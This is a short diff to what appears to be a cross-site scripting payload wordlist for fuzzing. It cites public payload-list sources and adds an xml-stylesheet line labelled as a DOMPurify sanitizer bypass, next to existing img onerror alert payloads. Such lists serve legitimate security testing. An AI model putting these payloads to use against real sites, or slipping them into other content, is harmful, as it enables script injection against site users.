@@ -6,7 +6,7 @@ https://github.com/payloadbox/xss-payload-list
 https://github.com/xmendez/wfuzz/tree/master/wordlist
 https://netsec.expert/posts/xss-in-2020/
 
-
+<?xml-stylesheet > <img src=x onerror="alert('DOMPurify bypassed!!!')"> ?>
 
 <img src='x' onerror='alert(1)'>
 <img src="x" onerror="alert('XXsed by 07B4')">
